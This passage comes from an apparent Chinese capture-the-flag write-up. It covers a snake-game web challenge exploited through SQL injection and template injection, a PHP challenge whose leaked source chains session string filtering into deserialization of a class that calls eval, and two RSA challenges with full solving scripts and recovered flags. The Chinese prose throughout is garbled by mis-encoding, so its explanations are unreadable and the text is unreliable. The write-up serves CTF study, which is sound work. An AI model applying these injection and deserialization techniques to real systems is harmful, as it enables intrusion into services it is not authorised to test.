direction: <span class="subst">&#123;next_direction&#125;</span>, Snake: <span class="subst">&#123;snake&#125;</span>, Food: <span class="subst">&#123;food&#125;</span>, Score: <span class="subst">&#123;new_score&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> status != <span class="string">&#x27;ok&#x27;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Game over with status: <span class="subst">&#123;status&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ç¨‹åºå·²é€€å‡º&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main_loop()</span><br></pre></td></tr></table></figure><p>â€‹æœ€åå¾—åˆ°äº†è¿™ä¸ªï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Response<span class="punctuation">:</span> <span class="punctuation">&#123;</span>&#x27;status&#x27;<span class="punctuation">:</span> &#x27;win&#x27;<span class="punctuation">,</span> &#x27;url&#x27;<span class="punctuation">:</span> &#x27;/snake_win?username=g01den&#x27;<span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åè®¿é—®è¿™ä¸ªè·¯ç”±ï¼Œæ„Ÿè§‰æ€ªæ€ªçš„ï¼Œæ²¡æœ‰ flagï¼Œå‘ç° username çš„å‚æ•°ç›´æ¥è¢«æ‰“å°äº†ï¼Œæµ‹ä¸€æµ‹ sstiï¼Œå¤±è´¥äº†ï¼Œå®Œè›‹ã€‚æˆ–è€…è¯´ï¼Œè¯•è¯•çœ‹ sql æ³¨å…¥ï¼Œèƒ½æˆåŠŸï¼Œæœ€åæ‰¾åˆ°äº†åˆ—æ•°ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/5084599173804427bdc3b1a2353bcb7a.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹èƒ½å‡ºï¼Œä¸è¿‡ï¼Œæˆ‘ä¸ç†è§£ä¸ºå•¥è¿™é‡Œä¹Ÿèƒ½å‡º sstiï¼Ÿè¯·çœ‹ VCRï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/32ea45b9656242ed8fde7ea072d05877.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹è¿™ä¸ªæºç å±‚é¢å’‹å®ç°çš„ï¼Ÿæœ‰ç‚¹åˆé’»äº†ï¼Œç®—äº†ï¼Œç›´æ¥å—¦ï¼ˆè¿™é‡Œè¢«å½“ä½œ html æ‰§è¡Œäº†ï¼Œæ‰€ä»¥çœ‹ä¸åˆ°ï¼‰ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/6f915faccad24280a7fc245b46464a92.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><img data-src="https://i-blog.csdnimg.cn/direct/80af9bc9b43b4694941b70507ec7d561.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹å¾—åˆ° flagã€‚</p><h2 id="platformå¤ç°"><a class="markdownIt-Anchor" href="#platformå¤ç°">#</a> platformï¼ˆå¤ç°ï¼‰ï¼š</h2><p>â€‹www.zip æ³„éœ²ï¼Œindexï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;user.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sessionManager</span> = <span class="keyword">new</span> <span class="title class_">SessionManager</span>();</span><br><span class="line"><span class="variable">$SessionRandom</span> = <span class="keyword">new</span> <span class="title class_">SessionRandom</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;session_key&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;session_key&#x27;</span>] =<span class="variable">$SessionRandom</span> -&gt; <span class="title function_ invoke__">generateRandomString</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;password&#x27;</span>] = <span class="variable">$password</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$sessionManager</span>-&gt;<span class="title function_ invoke__">filterSensitiveFunctions</span>();</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: dashboard.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">require</span> <span class="string">&#x27;login.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>â€‹å­˜åœ¨ <code>session_start();</code> ï¼Œä¼°æ‘¸ç€æœ‰ session ååºåˆ—åŒ–ï¼Œå…ˆè®°å½•ä¸‹ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SessionRandom</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">generateRandomString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$length</span> = <span class="title function_ invoke__">rand</span>(<span class="number">1</span>, <span class="number">50</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$characters</span> = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>;</span><br><span class="line">    <span class="variable">$charactersLength</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$characters</span>);</span><br><span class="line">    <span class="variable">$randomString</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$randomString</span> .= <span class="variable">$characters</span>[<span class="title function_ invoke__">rand</span>(<span class="number">0</span>, <span class="variable">$charactersLength</span> - <span class="number">1</span>)];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$randomString</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹ <code>['session_key']</code>  é•¿åº¦æ˜¯ 1 åˆ° 50 éšæœºçš„ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filterSensitiveFunctions</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$sessionFile</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getSessionFilePath</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$sessionFile</span>)) &#123;</span><br><span class="line">            <span class="variable">$sessionData</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$sessionFile</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;sensitiveFunctions <span class="keyword">as</span> <span class="variable">$function</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$sessionData</span>, <span class="variable">$function</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">                    <span class="variable">$sessionData</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$function</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$sessionData</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$sessionFile</span>, <span class="variable">$sessionData</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Sensitive functions have been filtered from the session file.&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Session file not found.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œä¹Ÿæœ‰ç‚¹å„¿é‡è¦ï¼Œæœ‰è¯»å– -&gt; æ›¿æ¢ -&gt; å†™å…¥ï¼Œå¹¶ä¸”æ˜¯æ“ä½œ session çš„æ–‡ä»¶ï¼Œæ„Ÿè§‰æ˜¯å­—ç¬¦é€ƒé€¸ï¼Œå˜å°‘çš„é‚£ç§ã€‚</p><p>â€‹è¿™é‡Œå­˜åœ¨ eval å‡½æ•°ï¼Œéœ€è¦ç›´æ¥å¯¹å…¶è¿›è¡Œååºåˆ—åŒ–ï¼Œç„¶åè§¦å‘ <code>__destruct</code> .</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">notouchitsclass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹ç°åœ¨å°±æ˜¯çœ‹çœ‹è§¦å‘ååºåˆ—åŒ–çš„æ–¹æ³•ã€‚å¤§ä½¬ä»¬è¯´ï¼Œå¯ä»¥é€šè¿‡è¿½åŠ å†™å…¥ï¼Œå¤§ä½¬ç”¨çš„æ˜¯ password æ•°ç»„å»é€ƒé€¸çš„ï¼Œè¿™é‡Œå…·ä½“åŸç†ä¸æ˜¯å¾ˆæ‡‚ï¼Œåæ­£æœ‰é™„ä»¶ï¼Œå…ˆè®°å½•ä¸‹ï¼Œä¹‹åæ£é¼“:</p><p><img data-src="https://i-blog.csdnimg.cn/direct/ae98b430553b49d78d78b3f4e9681058.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><img data-src="https://i-blog.csdnimg.cn/direct/7899de5fe03643afbcc30815a260aeaf.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto">#</a> Cryptoï¼š</h1><h2 id="eazyrsa"><a class="markdownIt-Anchor" href="#eazyrsa">#</a> eazyrsaï¼š</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"># encoding:utf-8</span><br><span class="line">from Crypto.Util.number import bytes_to_long, long_to_bytes</span><br><span class="line">from gmpy2 import mpz, iroot, powmod, invert, is_prime</span><br><span class="line">import sys</span><br><span class="line">import multiprocessing as mp</span><br><span class="line"></span><br><span class="line"># å®šä¹‰å¸¸é‡</span><br><span class="line">N = mpz(</span><br><span class="line">    &#x27;67962725468240199924103144864951334845750492508509360358636648068909779932072313362607631417524914992411826230276465100489023746209605790020210412575433464887238013738989770872867041592441153421617243161413094177629581581728221687772551567927241071007480087793370382177952900925657974338348428988433092737432689512506966089398873760401212521089061934975582692308605433023613521500237258699626587149952370997420510392932840377408736864097301789914658244266522930092113493152991783027162871212338968297436073316959569822974289536559300512091342692975133379473145882007983357289924135373382264527866381118893476257705939&#x27;)</span><br><span class="line"># gæ˜¯ä¸€ä¸ª500ä½æ•°ï¼Œä¸”gæ•´é™¤p-1å’Œq-1</span><br><span class="line">g = mpz(</span><br><span class="line">    &#x27;3235645591686044532495326878291617484542045511433360748778013933565021819649890342389737893735574764418484922895778834144345295691799766302763199373647&#x27;)</span><br><span class="line">e = 65537</span><br><span class="line">C = mpz(</span><br><span class="line">    &#x27;7918937034819399210460701361082120267249016865135589044938397478179178418982216265766430882604707450651405790878761026681351233717846491757101684210544361607883043938000941498442897699091016071609425252346011280078699567193949155766516051130050592046343488075564740812480634431357869210712013396437065989799117830247228129120071415956115563715118301273810713118159274551107354918579047901176471910532333125717712607469726900731370186233984133546278420585661042017307325998441634272568791745798269084955686428143476025911093137683806174746625559312685862694783475952178855060639359433340135424849663386199035593137765&#x27;)</span><br><span class="line"></span><br><span class="line"># è®¡ç®—è¾…åŠ©å˜é‡ï¼Œä½¿ç”¨æ•´æ•°é™¤æ³• //</span><br><span class="line">h = (N - 1) // g</span><br><span class="line">u = h // g</span><br><span class="line">v = h % g</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def worker_search(params):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    å·¥ä½œè¿›ç¨‹å‡½æ•°ï¼Œç”¨äºåœ¨æŒ‡å®šçš„rå’ŒsèŒƒå›´å†…æœç´¢c_exponentã€‚</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    r_start, r_end, s_start, s_end, D, b, final, N = params</span><br><span class="line">    for r in range(r_start, r_end):</span><br><span class="line">        target_exponent = r * D</span><br><span class="line">        for s in range(s_start, s_end):</span><br><span class="line">            c_exponent = target_exponent + s</span><br><span class="line">            current = powmod(b, c_exponent, N)</span><br><span class="line">            if current == final:</span><br><span class="line">                return c_exponent</span><br><span class="line">    return None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def solve_c_parallel(num_processes=4, D_multiplier=2):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    ä½¿ç”¨å¤šè¿›ç¨‹å¹¶è¡ŒåŒ–æœç´¢cï¼Œä½¿å¾— b^c â‰¡ final mod Nã€‚</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    sqrt_N = iroot(N, 2)[0]</span><br><span class="line">    C_approx = sqrt_N // (g * g)</span><br><span class="line"></span><br><span class="line">    b = powmod(2, g, N)</span><br><span class="line">    final = powmod(b, u, N)</span><br><span class="line"></span><br><span class="line">    for i in range(2, int(C_approx) + 1):</span><br><span class="line">        # è®¡ç®—D</span><br><span class="line">        D_root, is_exact = iroot(C_approx, 2)</span><br><span class="line">        D = (D_root + 1) * i</span><br><span class="line"></span><br><span class="line">        # å®šä¹‰rå’Œsçš„æœç´¢èŒƒå›´ï¼Œå¹¶å°†rçš„èŒƒå›´åˆ’åˆ†ä¸ºå¤šä¸ªå—ä»¥å¹¶è¡Œå¤„ç†</span><br><span class="line">        step = D // num_processes if D &gt; num_processes else 1</span><br><span class="line">        tasks = []</span><br><span class="line">        for p in range(num_processes):</span><br><span class="line">            r_start = p * step</span><br><span class="line">            r_end = (p + 1) * step if p &lt; num_processes - 1 else D</span><br><span class="line">            s_start = 0</span><br><span class="line">            s_end = D</span><br><span class="line">            params = (r_start, r_end, s_start, s_end, D, b, final, N)</span><br><span class="line">            tasks.append(params)</span><br><span class="line"></span><br><span class="line">        # åˆ›å»ºè¿›ç¨‹æ± å¹¶åˆ†é…ä»»åŠ¡</span><br><span class="line">        with mp.Pool(processes=num_processes) as pool:</span><br><span class="line">            results = pool.map(worker_search, tasks)</span><br><span class="line"></span><br><span class="line">        # æ£€æŸ¥æ˜¯å¦æœ‰ä»»ä½•å·¥ä½œè¿›ç¨‹æ‰¾åˆ°äº†c_exponent</span><br><span class="line">        for res in results:</span><br><span class="line">            if res is not None:</span><br><span class="line">                print(f&quot;Solution found: c = &#123;res&#125;&quot;)</span><br><span class="line">                return res</span><br><span class="line">    return None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    c = solve_c_parallel()</span><br><span class="line">    if c is not None:</span><br><span class="line">        print(&quot;c:&quot;, c)</span><br><span class="line"></span><br><span class="line">        # è®¡ç®—Aå’ŒB</span><br><span class="line">        A = u - c</span><br><span class="line">        B = v + c * g</span><br><span class="line"></span><br><span class="line">        # æ±‚è§£äºŒæ¬¡æ–¹ç¨‹x^2 - Bx + A = 0</span><br><span class="line">        discriminant = B * B - 4 * A</span><br><span class="line">        sqrt_discriminant, is_perfect_square = iroot(discriminant, 2)</span><br><span class="line">        if not is_perfect_square or sqrt_discriminant * sqrt_discriminant != discriminant:</span><br><span class="line">            print(&quot;åˆ¤åˆ«å¼ä¸æ˜¯å®Œå…¨å¹³æ–¹æ•°ã€‚&quot;)</span><br><span class="line">            sys.exit(1)</span><br><span class="line"></span><br><span class="line">        x = (B + sqrt_discriminant) // 2</span><br><span class="line">        y = (B - sqrt_discriminant) // 2</span><br><span class="line"></span><br><span class="line">        # è®¡ç®—aå’Œb</span><br><span class="line">        a_val = x // 2</span><br><span class="line">        b_val = y // 2</span><br><span class="line"></span><br><span class="line">        # è®¡ç®—på’Œq</span><br><span class="line">        p = 2 * g * a_val + 1</span><br><span class="line">        q = 2 * g * b_val + 1</span><br><span class="line"></span><br><span class="line">        # éªŒè¯på’Œqæ˜¯å¦ä¸ºç´ æ•°</span><br><span class="line">        if not is_prime(p):</span><br><span class="line">            print(&quot;p ä¸æ˜¯ç´ æ•°ã€‚&quot;)</span><br><span class="line">            sys.exit(1)</span><br><span class="line">        if not is_prime(q):</span><br><span class="line">            print(&quot;q ä¸æ˜¯ç´ æ•°ã€‚&quot;)</span><br><span class="line">            sys.exit(1)</span><br><span class="line"></span><br><span class="line">        # è®¡ç®—phi(N)</span><br><span class="line">        phi_N = (p - 1) * (q - 1)</span><br><span class="line"></span><br><span class="line">        # è®¡ç®—ç§é’¥æŒ‡æ•°d</span><br><span class="line">        try:</span><br><span class="line">            d = invert(e, phi_N)</span><br><span class="line">        except ZeroDivisionError:</span><br><span class="line">            print(&quot;eä¸phi(N)ä¸äº’è´¨ï¼Œæ— æ³•æ‰¾åˆ°é€†å…ƒã€‚&quot;)</span><br><span class="line">            sys.exit(1)</span><br><span class="line"></span><br><span class="line">        # è§£å¯†å¯†æ–‡</span><br><span class="line">        m = powmod(C, d, N)</span><br><span class="line">        decrypted_message = long_to_bytes(m)</span><br><span class="line"></span><br><span class="line">        print(&quot;è§£å¯†æ¶ˆæ¯:&quot;, decrypted_message)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;æœªæ‰¾åˆ°cçš„è§£ã€‚&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>Solution found: c = 51589121<br>c: 51589121<br> è§£å¯†æ¶ˆæ¯: bâ€™flag {bf82d1cd-67b1-42bd-a7b5-f119f0246dfe}â€™</p><p>æœ‰åŸé¢˜</p><p><span class="exturl" data-url="aHR0cHM6Ly9mNjFkLmdpdGh1Yi5pby9jcnlwdG8vUlNBL2h1d2FuZ2JlaTIwMTlfQ3J5cHRvMS8=">https://f61d.github.io/crypto/RSA/huwangbei2019_Crypto1/</span></p><h2 id="apbq"><a class="markdownIt-Anchor" href="#apbq">#</a> apbqï¼š</h2><p>ç¬¬ä¸€éƒ¨åˆ†</p><p><em>Ï•</em>=<em>n</em>1âˆ’<em>h</em>1+1=<em>p</em>Ã—<em>q</em>âˆ’(<em>p</em>+<em>q</em>)+1=(<em>p</em>âˆ’1)(<em>q</em>âˆ’1)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import long_to_bytes</span><br><span class="line">from gmpy2 import gmpy2</span><br><span class="line"></span><br><span class="line">hint1 = 18978581186415161964839647137704633944599150543420658500585655372831779670338724440572792208984183863860898382564328183868786589851370156024615630835636170</span><br><span class="line">n1,e1 = (89839084450618055007900277736741312641844770591346432583302975236097465068572445589385798822593889266430563039645335037061240101688433078717811590377686465973797658355984717210228739793741484666628342039127345855467748247485016133560729063901396973783754780048949709195334690395217112330585431653872523325589, 65537)</span><br><span class="line">c1 = 23664702267463524872340419776983638860234156620934868573173546937679196743146691156369928738109129704387312263842088573122121751421709842579634121187349747424486233111885687289480494785285701709040663052248336541918235910988178207506008430080621354232140617853327942136965075461701008744432418773880574136247</span><br><span class="line">phi = n1-hint1+1</span><br><span class="line">d = gmpy2.invert(e1,phi)</span><br><span class="line">m = pow(c1,d,n1)</span><br><span class="line">flag1 =long_to_bytes(m)</span><br><span class="line">print(flag1)</span><br><span class="line">#b&#x27;flag&#123;yOu_can_&#x27;</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒéƒ¨åˆ†</p><p>æƒ³åŠæ³•å› å¼åˆ†è§£ä¸€ä¸ª RSA æ¨¡æ•° ğ‘›=ğ‘Ã—ğ‘<em>n</em>=<em>p</em>Ã—<em>q</em></p><p>å…ˆæ±‚å‡º p,q</p><p>ç„¶åå®šæ ¼çŸ©é˜µ<br> DownUniderCTF 2023 ç›¸ä¼¼</p><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0Rvd25VbmRlckNURi9DaGFsbGVuZ2VzXzIwMjNfUHVibGljL2Jsb2IvbWFpbi9jcnlwdG8vYXBicS1yc2EtaWkvc29sdmUvc29sdi5zYWdl">https://github.com/DownUnderCTF/Challenges_2023_Public/blob/main/crypto/apbq-rsa-ii/solve/solv.sage</span></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">import itertools</span><br><span class="line">from Crypto.Util.number import long_to_bytes</span><br><span class="line"></span><br><span class="line"># n, c, hints</span><br><span class="line">c = 30332590230153809507216298771130058954523332140754441956121305005101434036857592445870499808003492282406658682811671092885592290410570348283122359319554197485624784590315564056341976355615543224373344781813890901916269854242660708815123152440620383035798542275833361820196294814385622613621016771854846491244</span><br><span class="line"></span><br><span class="line">n, e = (73566307488763122580179867626252642940955298748752818919017828624963832700766915409125057515624347299603944790342215380220728964393071261454143348878369192979087090394858108255421841966688982884778999786076287493231499536762158941790933738200959195185310223268630105090119593363464568858268074382723204344819, 65537)</span><br><span class="line"></span><br><span class="line">V = hints = [18167664006612887319059224902765270796893002676833140278828762753019422055112981842474960489363321381703961075777458001649580900014422118323835566872616431879801196022002065870575408411392402196289546586784096, 16949724497872153018185454805056817009306460834363366674503445555601166063612534131218872220623085757598803471712484993846679917940676468400619280027766392891909311628455506176580754986432394780968152799110962, 17047826385266266053284093678595321710571075374778544212380847321745757838236659172906205102740667602435787521984776486971187349204170431714654733175622835939702945991530565925393793706654282009524471957119991, 25276634064427324410040718861523090738559926416024529567298785602258493027431468948039474136925591721164931318119534505838854361600391921633689344957912535216611716210525197658061038020595741600369400188538567, 22620929075309280405649238349357640303875210864208854217420509497788451366132889431240039164552611575528102978024292550959541449720371571757925105918051653777519219003404406299551822163574899163183356787743543, 20448555271367430173134759139565874060609709363893002188062221232670423900235907879442989619050874172750997684986786991784813276571714171675161047891339083833557999542955021257408958367084435326315450518847393, 